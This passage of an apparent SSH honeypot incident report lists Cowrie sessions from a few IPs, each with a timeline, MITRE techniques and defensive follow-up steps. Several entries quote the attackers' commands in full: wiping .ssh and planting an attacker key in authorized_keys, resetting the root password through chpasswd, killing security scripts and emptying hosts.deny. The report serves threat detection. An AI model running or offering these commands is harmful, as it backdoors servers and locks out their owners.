| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:07:40` | `cowrie.session.connect` |
| `2026-04-05 20:07:40` | `cowrie.client.version` |
| `2026-04-05 20:07:41` | `cowrie.client.kex` |
| `2026-04-05 20:07:42` | `cowrie.login.success` |
| `2026-04-05 20:07:42` | `cowrie.session.params` |
| `2026-04-05 20:07:42` | `cowrie.command.input` |
| `2026-04-05 20:07:42` | `cowrie.command.failed` |
| `2026-04-05 20:07:43` | `cowrie.log.closed` |
| `2026-04-05 20:07:43` | `cowrie.session.params` |
| `2026-04-05 20:07:43` | `cowrie.command.input` |
| `2026-04-05 20:07:44` | `cowrie.session.file_download` |
| `2026-04-05 20:07:44` | `cowrie.log.closed` |
| `2026-04-05 20:07:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36899ca95512

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:07 |
| **Last Seen** | 2026-04-05 20:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:07:42` | `cowrie.session.connect` |
| `2026-04-05 20:07:42` | `cowrie.client.version` |
| `2026-04-05 20:07:42` | `cowrie.client.kex` |
| `2026-04-05 20:07:42` | `cowrie.login.success` |
| `2026-04-05 20:07:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00ba196e6625

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 20:07 |
| **Last Seen** | 2026-04-05 20:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:07:47` | `cowrie.session.connect` |
| `2026-04-05 20:07:47` | `cowrie.client.version` |
| `2026-04-05 20:07:48` | `cowrie.client.kex` |
| `2026-04-05 20:07:49` | `cowrie.login.success` |
| `2026-04-05 20:07:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f96270d46ff

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:10 |
| **Last Seen** | 2026-04-05 20:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:10:02` | `cowrie.session.connect` |
| `2026-04-05 20:10:02` | `cowrie.client.version` |
| `2026-04-05 20:10:02` | `cowrie.client.kex` |
| `2026-04-05 20:10:02` | `cowrie.login.success` |
| `2026-04-05 20:10:02` | `cowrie.session.params` |
| `2026-04-05 20:10:02` | `cowrie.command.input` |
| `2026-04-05 20:10:02` | `cowrie.command.failed` |
| `2026-04-05 20:10:03` | `cowrie.log.closed` |
| `2026-04-05 20:10:03` | `cowrie.session.params` |
| `2026-04-05 20:10:03` | `cowrie.command.input` |
| `2026-04-05 20:10:03` | `cowrie.session.file_download` |
| `2026-04-05 20:10:03` | `cowrie.log.closed` |
| `2026-04-05 20:10:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-006d0c6964cf

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:10 |
| **Last Seen** | 2026-04-05 20:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:10:04` | `cowrie.session.connect` |
| `2026-04-05 20:10:04` | `cowrie.client.version` |
| `2026-04-05 20:10:04` | `cowrie.client.kex` |
| `2026-04-05 20:10:05` | `cowrie.login.success` |
| `2026-04-05 20:10:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b6699e3bf39

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:12 |
| **Last Seen** | 2026-04-05 20:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:12:16` | `cowrie.session.connect` |
| `2026-04-05 20:12:16` | `cowrie.client.version` |
| `2026-04-05 20:12:17` | `cowrie.client.kex` |
| `2026-04-05 20:12:17` | `cowrie.login.success` |
| `2026-04-05 20:12:17` | `cowrie.session.params` |
| `2026-04-05 20:12:17` | `cowrie.command.input` |
| `2026-04-05 20:12:17` | `cowrie.command.failed` |
| `2026-04-05 20:12:17` | `cowrie.log.closed` |
| `2026-04-05 20:12:17` | `cowrie.session.params` |
| `2026-04-05 20:12:17` | `cowrie.command.input` |
| `2026-04-05 20:12:17` | `cowrie.session.file_download` |
| `2026-04-05 20:12:17` | `cowrie.log.closed` |
| `2026-04-05 20:12:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bec3b86253ff

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:12 |
| **Last Seen** | 2026-04-05 20:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:12:19` | `cowrie.session.connect` |
| `2026-04-05 20:12:19` | `cowrie.client.version` |
| `2026-04-05 20:12:19` | `cowrie.client.kex` |
| `2026-04-05 20:12:19` | `cowrie.login.success` |
| `2026-04-05 20:12:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed13c9bbeff8

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 20:13 |
| **Last Seen** | 2026-04-05 20:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:13:54` | `cowrie.session.connect` |
| `2026-04-05 20:13:54` | `cowrie.client.version` |
| `2026-04-05 20:13:54` | `cowrie.client.kex` |
| `2026-04-05 20:13:55` | `cowrie.login.success` |
| `2026-04-05 20:13:56` | `cowrie.session.params` |
| `2026-04-05 20:13:56` | `cowrie.command.input` |
| `2026-04-05 20:13:56` | `cowrie.command.failed` |
| `2026-04-05 20:13:56` | `cowrie.log.closed` |
| `2026-04-05 20:13:57` | `cowrie.session.params` |
| `2026-04-05 20:13:57` | `cowrie.command.input` |
| `2026-04-05 20:13:57` | `cowrie.session.file_download` |
| `2026-04-05 20:13:57` | `cowrie.log.closed` |
| `2026-04-05 20:14:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77b884f3fbb7

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 20:14 |
| **Last Seen** | 2026-04-05 20:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:14:01` | `cowrie.session.connect` |
| `2026-04-05 20:14:01` | `cowrie.client.version` |
| `2026-04-05 20:14:01` | `cowrie.client.kex` |
| `2026-04-05 20:14:03` | `cowrie.login.success` |
| `2026-04-05 20:14:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5954c7abf57e

| Field | Detail |
|---|---|
| **Source IP** | `180.76.105[.]16` |
| **First Seen** | 2026-04-05 20:14 |
| **Last Seen** | 2026-04-05 20:15 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:LuolBgCIxYSK"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:14:41` | `cowrie.session.connect` |
| `2026-04-05 20:14:41` | `cowrie.client.version` |
| `2026-04-05 20:14:43` | `cowrie.client.kex` |
| `2026-04-05 20:14:46` | `cowrie.login.success` |
| `2026-04-05 20:14:46` | `cowrie.session.params` |
| `2026-04-05 20:14:46` | `cowrie.command.input` |
| `2026-04-05 20:14:46` | `cowrie.command.failed` |
| `2026-04-05 20:14:47` | `cowrie.log.closed` |
| `2026-04-05 20:14:47` | `cowrie.session.params` |
| `2026-04-05 20:14:47` | `cowrie.command.input` |
| `2026-04-05 20:14:48` | `cowrie.session.file_download` |
| `2026-04-05 20:14:48` | `cowrie.log.closed` |
| `2026-04-05 20:15:01` | `cowrie.session.params` |
| `2026-04-05 20:15:01` | `cowrie.command.input` |
| `2026-04-05 20:15:02` | `cowrie.log.closed` |
| `2026-04-05 20:15:02` | `cowrie.session.params` |
| `2026-04-05 20:15:02` | `cowrie.command.input` |
| `2026-04-05 20:15:03` | `cowrie.log.closed` |
| `2026-04-05 20:15:04` | `cowrie.session.params` |
| `2026-04-05 20:15:04` | `cowrie.command.input` |
| `2026-04-05 20:15:04` | `cowrie.session.file_download` |
| `2026-04-05 20:15:04` | `cowrie.log.closed` |
| `2026-04-05 20:15:05` | `cowrie.session.params` |
| `2026-04-05 20:15:05` | `cowrie.command.input` |
| `2026-04-05 20:15:06` | `cowrie.log.closed` |
| `2026-04-05 20:15:06` | `cowrie.session.params` |
| `2026-04-05 20:15:06` | `cowrie.command.input` |
| `2026-04-05 20:15:07` | `cowrie.log.closed` |
| `2026-04-05 20:15:08` | `cowrie.session.params` |
| `2026-04-05 20:15:08` | `cowrie.command.input` |
| `2026-04-05 20:15:08` | `cowrie.command.input` |
| `2026-04-05 20:15:10` | `cowrie.log.closed` |
| `2026-04-05 20:15:10` | `cowrie.session.params` |
| `2026-04-05 20:15:10` | `cowrie.command.input` |
| `2026-04-05 20:15:11` | `cowrie.log.closed` |
| `2026-04-05 20:15:12` | `cowrie.session.params` |
| `2026-04-05 20:15:12` | `cowrie.command.input` |
| `2026-04-05 20:15:12` | `cowrie.log.closed` |
| `2026-04-05 20:15:12` | `cowrie.session.params` |
| `2026-04-05 20:15:12` | `cowrie.command.input` |
| `2026-04-05 20:15:12` | `cowrie.log.closed` |
| `2026-04-05 20:15:13` | `cowrie.session.params` |
| `2026-04-05 20:15:13` | `cowrie.command.input` |
| `2026-04-05 20:15:13` | `cowrie.log.closed` |
| `2026-04-05 20:15:15` | `cowrie.session.params` |
| `2026-04-05 20:15:15` | `cowrie.command.input` |
| `2026-04-05 20:15:15` | `cowrie.log.closed` |
| `2026-04-05 20:15:16` | `cowrie.session.params` |
| `2026-04-05 20:15:16` | `cowrie.command.input` |
| `2026-04-05 20:15:16` | `cowrie.log.closed` |
| `2026-04-05 20:15:17` | `cowrie.session.params` |
| `2026-04-05 20:15:17` | `cowrie.command.input` |
| `2026-04-05 20:15:17` | `cowrie.log.closed` |
| `2026-04-05 20:15:18` | `cowrie.session.params` |
| `2026-04-05 20:15:18` | `cowrie.command.input` |
| `2026-04-05 20:15:18` | `cowrie.log.closed` |
| `2026-04-05 20:15:19` | `cowrie.session.params` |
| `2026-04-05 20:15:19` | `cowrie.command.input` |
| `2026-04-05 20:15:19` | `cowrie.log.closed` |
| `2026-04-05 20:15:19` | `cowrie.session.params` |
| `2026-04-05 20:15:19` | `cowrie.command.input` |
| `2026-04-05 20:15:19` | `cowrie.log.closed` |
| `2026-04-05 20:15:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.105[.]16` to AbuseIPDB if not already reported
- [ ] Block `180.76.105[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-561d9250a575

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 20:15 |
| **Last Seen** | 2026-04-05 20:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:15:00` | `cowrie.session.connect` |
| `2026-04-05 20:15:00` | `cowrie.client.version` |
| `2026-04-05 20:15:00` | `cowrie.client.kex` |
| `2026-04-05 20:15:01` | `cowrie.login.success` |
| `2026-04-05 20:15:02` | `cowrie.session.params` |
| `2026-04-05 20:15:02` | `cowrie.command.input` |
| `2026-04-05 20:15:02` | `cowrie.command.failed` |
| `2026-04-05 20:15:02` | `cowrie.log.closed` |
| `2026-04-05 20:15:03` | `cowrie.session.params` |
| `2026-04-05 20:15:03` | `cowrie.command.input` |
| `2026-04-05 20:15:03` | `cowrie.session.file_download` |
| `2026-04-05 20:15:03` | `cowrie.log.closed` |
| `2026-04-05 20:15:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55b2e226e642

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 20:15 |
| **Last Seen** | 2026-04-05 20:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:15:07` | `cowrie.session.connect` |
| `2026-04-05 20:15:07` | `cowrie.client.version` |
| `2026-04-05 20:15:07` | `cowrie.client.kex` |
| `2026-04-05 20:15:08` | `cowrie.login.success` |
| `2026-04-05 20:15:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-900554e845fd

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 20:16 |
| **Last Seen** | 2026-04-05 20:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:16:06` | `cowrie.session.connect` |
| `2026-04-05 20:16:06` | `cowrie.client.version` |
| `2026-04-05 20:16:06` | `cowrie.client.kex` |
| `2026-04-05 20:16:07` | `cowrie.login.success` |
| `2026-04-05 20:16:08` | `cowrie.session.params` |
| `2026-04-05 20:16:08` | `cowrie.command.input` |
| `2026-04-05 20:16:08` | `cowrie.command.failed` |
| `2026-04-05 20:16:08` | `cowrie.log.closed` |
| `2026-04-05 20:16:09` | `cowrie.session.params` |
| `2026-04-05 20:16:09` | `cowrie.command.input` |
| `2026-04-05 20:16:09` | `cowrie.session.file_download` |
| `2026-04-05 20:16:09` | `cowrie.log.closed` |
| `2026-04-05 20:16:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c21f3de29d9

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 20:16 |
| **Last Seen** | 2026-04-05 20:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:16:13` | `cowrie.session.connect` |
| `2026-04-05 20:16:13` | `cowrie.client.version` |
| `2026-04-05 20:16:13` | `cowrie.client.kex` |
| `2026-04-05 20:16:14` | `cowrie.login.success` |
| `2026-04-05 20:16:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc270949a14c

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 20:18 |
| **Last Seen** | 2026-04-05 20:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:18:17` | `cowrie.session.connect` |
| `2026-04-05 20:18:17` | `cowrie.client.version` |
| `2026-04-05 20:18:18` | `cowrie.client.kex` |
| `2026-04-05 20:18:19` | `cowrie.login.success` |
| `2026-04-05 20:18:20` | `cowrie.session.params` |
| `2026-04-05 20:18:20` | `cowrie.command.input` |
| `2026-04-05 20:18:20` | `cowrie.command.failed` |
| `2026-04-05 20:18:20` | `cowrie.log.closed` |
| `2026-04-05 20:18:21` | `cowrie.session.params` |
